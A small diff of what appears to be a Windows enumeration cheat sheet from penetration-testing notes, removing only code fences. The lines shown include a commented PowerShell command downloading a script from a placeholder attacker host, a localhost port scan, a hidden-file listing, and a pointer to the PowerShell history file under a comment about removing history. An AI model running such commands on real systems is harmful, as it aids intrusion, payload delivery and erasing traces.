@@ -1,4 +1,3 @@
-```
 @echo off
 #windo
 #(New-Object System.Net.WebClient).Downloadfile('http://<LHOST>:<LPORT>/win3num.bat') #download file
@@ -47,4 +46,3 @@ Test-NetConnection localhost -Port $i
 Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
 #remove bash history files
 %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-```
